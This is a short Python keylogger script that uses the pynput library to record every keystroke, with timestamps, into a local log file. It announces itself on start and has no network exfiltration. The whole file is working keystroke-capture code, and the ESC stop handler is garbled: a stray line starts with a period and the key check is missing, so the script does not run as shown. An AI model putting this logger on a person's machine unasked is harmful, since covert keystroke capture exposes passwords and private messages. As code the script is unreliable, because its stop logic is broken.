from pynput import keyboard
import os
from datetime import datetime

# Create a logs directory if it doesn't exist
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Log file with timestamp
log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")

# Function to format and write keystrokes
def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key.name.upper()}]"

    with open(log_file, "a") as f:
        f.write(f"{datetime.now().strftime('%H:%M:%S')} - {key_str}\n")

# Start the keylogger
def start_keylogger():
    print("[*] Keylogger started... (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Stop if ESC is pressed
def on_release(key):
.        print("[*] Keylogger stopped.")
        return False
    return None


if __name__ == "__main__":
    start_keylogger()
